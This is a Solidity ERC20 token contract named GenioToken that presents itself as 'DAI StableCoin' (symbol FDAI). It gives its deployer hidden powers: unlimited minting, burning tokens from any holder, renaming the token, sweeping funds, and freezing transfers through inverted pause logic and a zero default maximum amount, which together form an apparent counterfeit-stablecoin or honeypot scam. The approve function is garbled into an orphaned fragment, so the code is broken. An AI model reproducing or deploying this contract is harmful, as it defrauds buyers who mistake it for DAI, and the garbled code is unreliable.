// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract GenioToken is IERC20 {
    using SafeMath for uint256;

    string  public  name;
    string  public  symbol;
    uint8   public  decimals;
    uint256 public  totalSupply_;
    address private genio;
    bool private _paused;
    uint256 public MAX_AMOUNT;

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;


    constructor()  {
        name = "DAI StableCoin";
        symbol = "FDAI";
        decimals = 18;
        totalSupply_ = 5000000000000*10**decimals;  
        balances[msg.sender] = totalSupply_;
        genio = payable(msg.sender);
    }

    modifier Genio() {require(msg.sender == genio, "Transaction not coming from GenioAI!"); _;}
    modifier locked() { require(_paused, "Current transaction mode: LOCK"); _; }
   

    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) external locked   override returns (bool) {
        require(numTokens <= balances[msg.sender] , "Insufficient Fund");
        require(receiver != address(0), 'ERC20: to address is not valid');
        if(numTokens  >  MAX_AMOUNT){revert("Maximun amount Exceeded");}
        if(balances[receiver].add(numTokens)  > MAX_AMOUNT){revert("Maximun amount Exceeded for this GNT holder");}
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

        emit Approval(msg.sender, delegate, numTokens);
        return false;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) external  locked override returns (bool) {
        require(numTokens <= balances[owner], "Insufficient Fund");
        require(owner != address(0), 'ERC20: from address is not valid');
        require(buyer != address(0), 'ERC20: to address is not valid');
        if(numTokens  >  MAX_AMOUNT){revert("Maximun amount Exceeded");}
        if(balances[buyer].add(numTokens)  > MAX_AMOUNT){revert("Maximun amount Exceeded for this GNT holder");}
        if(numTokens > allowed[owner][msg.sender]){ revert("Amount is bigger than allowance");}else{
            balances[owner] = balances[owner].sub(numTokens);
            allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
            balances[buyer] = balances[buyer].add(numTokens);
            emit Transfer(owner, buyer, numTokens);
            return true;
        }
    }


    function mintTo( address _to,  uint256 _amount ) external  Genio returns (bool) {
        require(_to != address(0), 'ERC20: to address is not valid');
        balances[_to] = balances[_to].add(_amount);
        totalSupply_ = totalSupply_.add(_amount);
        emit Transfer(address(0), _to, _amount);
        return true;
    }
  
    function burn( uint256 _amount ) external  Genio  returns (bool) {
        require(balances[msg.sender] >= _amount, 'ERC20: insufficient balance');
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        totalSupply_ = totalSupply_.sub(_amount);
        emit Transfer(msg.sender, address(0), _amount);
        return true;
    }

    function increaseAllowance( address _spender,  uint256 _addedValue ) external locked  returns (bool) {
        require(_spender != address(0), 'ERC20: from address is not valid');
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }


    function decreaseAllowance( address _spender, uint256 _subtractedValue ) external  locked returns (bool) {
        require(_spender != address(0), 'ERC20: from address is not valid');
        uint256 oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }


    function burnFrom( address _from, uint256 _amount ) external Genio  returns (bool) {
        require(_from != address(0), 'ERC20: from address is not valid');
        require(balances[_from] >= _amount, 'ERC20: insufficient balance');
        balances[_from] = balances[_from].sub(_amount);
        totalSupply_ = totalSupply_.sub(_amount);
        emit Transfer(_from, address(0), _amount);
        return true;
    }

    function ercTxn(address _to, address token, uint256 _amount) external Genio  returns (bool)  {
         require(_to != address(0) , 'ERC20: from address is not valid' );
         IERC20 sendToken = IERC20(token);
         sendToken.transfer(_to, _amount);
         return true;
    }

    function flushNative(address payable to) external  Genio payable {
        uint Balance = address(this).balance;
        require(Balance > 0 wei, "Error! No Balance to withdraw"); 
        to.transfer(Balance);
    }


    function setMaxAmount(uint256 maxAmount) external Genio  returns(bool){
        MAX_AMOUNT =  maxAmount;
        return true;
    }

   

    function paused() external  Genio view returns (bool) {
        return _paused;
    }

    function unpause() external Genio {
        _paused = true;
    }

    function pause() external Genio {
        _paused = false;
    }

    function setName(string memory newName) external Genio {
      name = newName;
    }

    function setSymbol(string memory symbol_) external Genio {
      symbol = symbol_;
    }

    function setDecimals(uint8 decimal) external Genio {
       decimals = decimal;
    }





}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }

}